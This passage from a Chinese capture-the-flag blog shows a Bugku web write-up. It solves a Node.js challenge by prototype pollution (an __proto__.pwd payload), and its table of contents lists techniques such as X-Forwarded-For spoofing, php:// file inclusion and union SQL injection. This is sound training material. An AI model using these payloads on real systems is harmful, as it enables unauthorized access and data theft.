class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&#x27;&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;注册&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/update&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.challenger === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.attrkey === <span class="literal">undefined</span> || req.body.attrval === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;传参有误&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.attrkey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.attrval.toString();</span><br><span class="line">            setFn(req.session.challenger, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>

<p>下面例子可以看到。我们只需要在最开始的原形中增加参数，其后者都会继承</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数(Person)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name</span><br><span class="line">    <span class="built_in">this</span>.age = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化(Person)</span></span><br><span class="line"><span class="keyword">var</span> per = <span class="keyword">new</span> Person(<span class="string">&#x27;小王&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"><span class="built_in">console</span>.log(per.password)  <span class="comment">//undefined</span></span><br><span class="line"></span><br><span class="line">Person.prototype.password = <span class="string">&quot;adasd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(per.password)  <span class="comment">//adasd</span></span><br></pre></td></tr></table></figure>

<p>2.所以构造</p>
<p>attrkey=age&amp;attrval=20 绕过年龄限制</p>
<p>attrkey=<strong>proto</strong>.pwd&amp;attrval=222 添加新的原型</p>
<p>password=222&amp;key=pwd 即可得到flag</p>
<p>所以进行传参，想某一对象的原形增加参数</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">data</span>=&#123;<span class="string">&quot;attrkey&quot;</span>:<span class="string">&quot;__proto__.pwd&quot;</span>,<span class="string">&quot;attrval&quot;</span>:<span class="string">&quot;222&quot;</span>&#125;</span><br><span class="line">update(url,<span class="keyword">data</span>)</span><br><span class="line">#通过这样的方式我们把原形增加了 &#123;pwd:<span class="number">222</span>&#125;</span><br><span class="line">#如果Admin[key]  本身没有pwd参数的话，就回从上找原形。故通过这种方式</span><br><span class="line">Admin[<span class="string">&#x27;pwd&#x27;</span>]=<span class="number">222</span></span><br><span class="line">所以我们在进行传入代码</span><br><span class="line"><span class="keyword">data</span>=&#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;222&quot;</span>,<span class="string">&quot;key&quot;</span>:<span class="string">&quot;pwd&quot;</span>&#125;</span><br><span class="line">getflag(url,<span class="keyword">data</span>) 即可获取flag</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/bugku%E5%A4%A7%E5%A4%9A%E6%95%B0web%E9%A2%98%E7%9B%AE%EF%BC%8C%E5%89%A9%E4%B8%8B%E7%9A%84%E8%83%BD%E5%8A%9B%E6%8F%90%E9%AB%98%E4%BA%86/" rel="tag"># bugku大多数web题目，剩下的能力提高了</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/04/13/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/" rel="prev" title="Linux基本操作命令">
      <i class="fa fa-chevron-left"></i> Linux基本操作命令
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/05/06/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E6%BC%8F%E6%B4%9E/" rel="next" title="跨域资源共享CORS漏洞">
      跨域资源共享CORS漏洞 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bugku-web-%E7%B1%BB%E5%9E%8B90-%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E5%89%A9%E4%B8%8B%E7%9A%84%E9%9A%BE%E7%9A%84%E5%86%B3%E5%AE%9A%E5%86%8D%E6%89%BE%E6%97%B6%E9%97%B4%E6%9B%B4%E6%96%B0%E3%80%82"><span class="nav-number">1.</span> <span class="nav-text">Bugku web 类型90%的题目，剩下的难的决定再找时间更新。</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Simple-SSTI-1"><span class="nav-number">1.1.</span> <span class="nav-text">Simple_SSTI_1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%80%83%E5%AF%9Fflask"><span class="nav-number">1.1.1.</span> <span class="nav-text">考察flask</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval"><span class="nav-number">1.2.</span> <span class="nav-text">eval</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%EF%BC%8Cprint-r-file-%E2%80%9C-flag-php%E2%80%9D-%E6%89%93%E5%8D%B0%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.1.</span> <span class="nav-text">拼接引号闭合，print_r(file(“.&#x2F;flag.php”));打印文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="nav-number">1.3.</span> <span class="nav-text">网站被黑</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8%E5%BE%A1%E5%89%91%E5%90%8E%E5%8F%B0%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%8F%91%E7%8E%B0"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.使用御剑后台扫描工具发现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-114-67-175-224-17941-shell-php%E6%98%AF%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86"><span class="nav-number">1.3.2.</span> <span class="nav-text">http:&#x2F;&#x2F;114.67.175.224:17941&#x2F;shell.php是一个后台登陆</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8burpsuite%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="nav-number">1.3.3.</span> <span class="nav-text">2.使用burpsuite爆破密码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-number">1.4.</span> <span class="nav-text">本地管理员</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%91%E7%8E%B0base64%EF%BC%8C%E4%B8%BAtest123%EF%BC%8C%E4%BD%BF%E7%94%A8admin%E7%99%BB%E9%99%86%EF%BC%8C%E6%8F%90%E7%A4%BA%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E3%80%82"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%9E%84%E9%80%A0X-Forwarded-For-127-0-0-1%EF%BC%8C%E5%86%8D%E6%AC%A1%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%E5%BE%97%E5%88%B0flag%E3%80%82"><span class="nav-number">1.4.2.</span> <span class="nav-text">2.构造X-Forwarded-For: 127.0.0.1，再次登录成功得到flag。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%98%E9%87%8F1"><span class="nav-number">1.5.</span> <span class="nav-text">变量1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Simple-SSTI-2"><span class="nav-number">1.6.</span> <span class="nav-text">Simple_SSTI_2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%AD%A6%E4%B9%A0%E7%BD%91%E5%9D%80-SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%85%A5%E9%97%A8%E7%AF%87%EF%BC%89-bmjoker-%E5%8D%9A%E5%AE%A2%E5%9B%AD-cnblogs-com"><span class="nav-number">1.6.1.</span> <span class="nav-text">1.学习网址 SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8tplmap"><span class="nav-number">1.6.2.</span> <span class="nav-text">2.使用tplmap</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.7.</span> <span class="nav-text">源代码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.7.1.</span> <span class="nav-text">1查看源代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8url%E8%A7%A3%E7%A0%81"><span class="nav-number">1.7.2.</span> <span class="nav-text">2.使用url解码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E8%BE%93%E5%85%A567d709b2b54aa2aa648cf6e87a7114f1%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="nav-number">1.7.3.</span> <span class="nav-text">3.输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.8.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8php-filter"><span class="nav-number">1.8.0.1.</span> <span class="nav-text">构造利用php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81"><span class="nav-number">1.9.</span> <span class="nav-text">好像需要密码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%A8burp%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81%EF%BC%8C%E7%BA%BF%E7%A8%8B%E6%95%B0%E8%AE%BE%E7%BD%AE%E6%88%9050%E3%80%82%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E5%AF%86%E7%A0%8112468"><span class="nav-number">1.9.1.</span> <span class="nav-text">用burp爆破密码，线程数设置成50。可以得到密码12468</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Flask-FileUpload"><span class="nav-number">1.10.</span> <span class="nav-text">Flask_FileUpload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%9C%A8%E5%9B%BE%E7%89%87%E4%B8%AD%E5%86%99%E5%85%A5%E5%9C%A8%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.10.1.</span> <span class="nav-text">1.在图片中写入在上传</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%9F%A5%E7%9C%8B%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="nav-number">1.10.2.</span> <span class="nav-text">2.查看网页源代码即可得到flag</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF"><span class="nav-number">1.11.</span> <span class="nav-text">备份是个好习惯</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E5%8A%A0index-php-bak%E8%8E%B7%E5%BE%97php%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.11.1.</span> <span class="nav-text">1.使用网址后面加index.php.bak获得php的源代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#114-67-175-224-17086-kekeyy1-1-amp-kekeyy2-2"><span class="nav-number">1.11.2.</span> <span class="nav-text">[114.67.175.224:17086&#x2F;?kekeyy1]&#x3D;1&amp;kekeyy2[]&#x3D;2</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#game1"><span class="nav-number">1.12.</span> <span class="nav-text">game1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E7%8E%A9%E5%AE%8C%E6%B8%B8%E6%88%8F%E6%8A%93%E5%8C%85%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%EF%BC%9A"><span class="nav-number">1.12.1.</span> <span class="nav-text">1.玩完游戏抓包可以得到：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%9F%A5%E6%89%BEscore-php%E5%9C%A8%E6%BA%90%E4%BB%A3%E7%A0%81%E9%87%8C"><span class="nav-number">1.12.2.</span> <span class="nav-text">2.查找score.php在源代码里</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E6%89%BE%E5%88%B0%E8%A7%84%E5%BE%8B%E4%B8%BAsign-%E2%80%99zM%E2%80%99-base64-score-%E2%80%99-%E2%80%99"><span class="nav-number">1.12.3.</span> <span class="nav-text">3.找到规律为sign&#x3D;’zM’+base64(score)+’&#x3D;&#x3D;’</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-%E4%B8%80%E4%B8%AA%E9%9D%9E%E5%B8%B8%E5%A5%BD%E7%9A%84%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E9%A2%98%E7%9B%AE-%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90-%E5%BB%BA%E8%AE%AE%E6%B0%B8%E4%B9%85%E6%94%B6%E8%97%8F"><span class="nav-number">1.13.</span> <span class="nav-text">成绩查询(一个非常好的联合注入实战题目 强烈推荐 建议永久收藏)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%97%B6%E5%89%8D%E5%BC%8F%E5%BF%85%E9%A1%BB%E8%BF%94%E5%9B%9E%E4%B8%BA%E7%A9%BA"><span class="nav-number">1.13.1.</span> <span class="nav-text">注意联合注入时前式必须返回为空</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9B%A0%E4%B8%BA%E6%9E%84%E9%80%A0id-1%E2%80%99-order-by-5-%E6%97%B6%EF%BC%8C%E6%B2%A1%E6%9C%89%E6%AD%A3%E5%B8%B8%E5%9B%9E%E6%98%BE%EF%BC%8Cid-1%E2%80%99-order-by-4-%E6%97%B6%EF%BC%8C%E6%AD%A3%E5%B8%B8%E5%9B%9E%E6%98%BE%EF%BC%8C%E6%89%80%E4%BB%A5%E5%88%A4%E6%96%AD%E6%9C%894%E5%88%97"><span class="nav-number">1.13.2.</span> <span class="nav-text">因为构造id&#x3D;1’ order by 5#时，没有正常回显，id&#x3D;1’ order by 4#时，正常回显，所以判断有4列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E7%94%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%E5%88%99%EF%BC%9A%E9%A1%B5%E9%9D%A2%E5%BF%85%E9%A1%BB%E6%9C%89%E6%98%BE%E7%A4%BA%E4%BD%8D%E3%80%82-2-union%E5%8F%AF%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%88%96%E5%A4%9A%E4%B8%AAselect%E8%AF%AD%E5%8F%A5%E7%9A%84%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E5%89%8D%E6%8F%90%E6%98%AF%E4%B8%A4%E4%B8%AAselect%E5%BF%85%E6%9C%89%E7%9B%B8%E5%90%8C%E5%88%97%E3%80%81%E4%B8%94%E5%90%84%E5%88%97%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B9%9F%E7%9B%B8%E5%90%8C"><span class="nav-number">1.13.3.</span> <span class="nav-text">1.用联合查询进行注入则：页面必须有显示位。 2.union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cookies"><span class="nav-number">1.14.</span> <span class="nav-text">cookies</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-a2V5cy50eHQ-%E6%98%AFkeys-php%EF%BC%8C%E4%BF%AE%E6%94%B9index-php%E7%9A%84base64%E4%B8%BAfilename%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97php%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81%E3%80%82"><span class="nav-number">1.14.1.</span> <span class="nav-text">1.a2V5cy50eHQ&#x3D; 是keys.php，修改index.php的base64为filename，可以获得php的源代码。</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5base64%E8%A7%A3%E7%A0%81-url%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0"><span class="nav-number">1.14.1.1.</span> <span class="nav-text">直接base64解码+url解码得到</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E4%B8%AD%E5%BE%85%E5%8C%B9%E9%85%8D%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%89%E5%B7%B2%E7%A1%AE%E5%AE%9A%E4%B8%BA-%E2%80%9C1114%E2%80%9D%EF%BC%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%89%E7%94%B1-%E2%80%9C111%E2%80%9D-%E8%BF%9E%E6%8E%A5-b-%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E7%BB%84%E6%88%90%EF%BC%8C%E8%8B%A5%E4%BB%A4-substr-b-0-1-%E2%80%9C-x00%E2%80%9D%EF%BC%8C%E5%8D%B3%E6%BB%A1%E8%B6%B3-%E2%80%9C1114%E2%80%9D-%E4%B8%8E-%E2%80%9C111%E2%80%9D%E5%8C%B9%E9%85%8D%E3%80%82%E5%9B%A0%E6%AD%A4%EF%BC%8C%E8%BF%99%E9%87%8C%E5%81%87%E8%AE%BE-b-%E2%80%9C-x0012345%E2%80%9D%EF%BC%8C%E6%89%8D%E8%83%BD%E6%BB%A1%E8%B6%B3%E6%9D%A1%E4%BB%B6%E3%80%82"><span class="nav-number">1.14.1.2.</span> <span class="nav-text">源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) &#x3D; “\x00”，即满足 “1114” 与 “111”匹配。因此，这里假设 $b &#x3D; “\x0012345”，才能满足条件。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%AA%E5%A1%AB%E5%85%A5bugku-is-a-nice-plateform"><span class="nav-number">1.14.1.3.</span> <span class="nav-text">只填入bugku is a nice plateform!</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99"><span class="nav-number">1.15.</span> <span class="nav-text">程序员本地网站</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%8A%A0%E5%85%A5X-Forwarded-For-127-0-0-1%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="nav-number">1.15.1.</span> <span class="nav-text">请求头加入X-Forwarded-For: 127.0.0.1即可得到flag</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MD5"><span class="nav-number">1.16.</span> <span class="nav-text">MD5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%98%AFmd5%E7%A2%B0%E6%92%9E%EF%BC%8C%E6%89%80%E4%BB%A5%E8%B5%8B%E7%BB%99-a-s878926199a-%E5%8D%B3md5%E6%98%AF0e%E5%BC%80%E5%A4%B4%E7%9A%84%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag%E3%80%82%E8%BF%99%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%87%BA%E5%BE%97%E4%B8%8D%E5%A5%BD%EF%BC%8C%E8%BF%9E%E6%BA%90%E7%A0%81%E9%83%BD%E4%B8%8D%E7%BB%99%E3%80%82"><span class="nav-number">1.16.1.</span> <span class="nav-text">题目是md5碰撞，所以赋给?a&#x3D;s878926199a,即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#login1"><span class="nav-number">1.17.</span> <span class="nav-text">login1</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9FSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E5%B0%B1%E6%98%AF%E5%88%A9%E7%94%A8%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%EF%BC%8C%E6%AF%94%E5%A6%82%E6%9C%80%E9%95%BF%E5%8F%AA%E8%83%BD%E6%9C%8915%E4%B8%AA%E5%AD%97%E7%AC%A6%E7%9A%84%E8%AF%9D%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E8%BE%93%E5%85%A5%E7%9A%84%E6%98%AFabcdefghijklmnop-16%E4%BD%8D%EF%BC%89%EF%BC%8C%E9%82%A3%E4%B9%88%E4%BF%9D%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8C%E7%9A%84%E5%B0%B1%E6%98%AFabcdefghijklmno%EF%BC%8C%E9%82%A3%E4%B9%88%E5%88%AB%E4%BA%BA%E7%94%A8abcdefghijklmno%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%99%BB%E9%99%86%E3%80%82"><span class="nav-number">1.17.0.1.</span> <span class="nav-text">约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop(16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%98%E6%9C%89%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%9C%B0%E6%96%B9%E5%B0%B1%E6%98%AFSQL%E5%9C%A8%E6%89%A7%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E7%9A%84%E6%97%B6%E5%80%99%E6%98%AF%E4%BC%9A%E8%87%AA%E5%8A%A8%E4%BF%AE%E5%89%AA%E6%8E%89%E5%B0%BE%E9%83%A8%E7%9A%84%E7%A9%BA%E7%99%BD%E7%AC%A6%E7%9A%84%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E2%80%9Dabc%E2%80%9D-%E2%80%9Dabc-%E2%80%9C%EF%BC%8C%E5%90%8C%E6%A0%B7%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%E5%90%8D%E4%B8%BA%E2%80%9Dabc-%E2%80%9C%E7%9A%84%E8%B4%A6%E5%8F%B7%E6%9D%A5%E7%99%BB%E9%99%86%E2%80%9Dabc%E2%80%9D%E7%9A%84%E8%B4%A6%E5%8F%B7%E3%80%82"><span class="nav-number">1.17.0.2.</span> <span class="nav-text">还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”&#x3D;&#x3D;”abc “，同样我们可以通过注册用户名为”abc “的账号来登陆”abc”的账号。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-get-contents"><span class="nav-number">1.18.</span> <span class="nav-text">file_get_contents</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%98%AFbp%E9%87%8CGET-ac-flag-amp-fn-php-input-HTTP-1-1-%E5%86%85%E5%AE%B9%E6%98%AFflag%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="nav-number">1.18.1.</span> <span class="nav-text">1.第一种方式是bp里GET &#x2F;?ac&#x3D;flag&amp;fn&#x3D;php:&#x2F;&#x2F;input HTTP&#x2F;1.1  内容是flag，即可得到flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 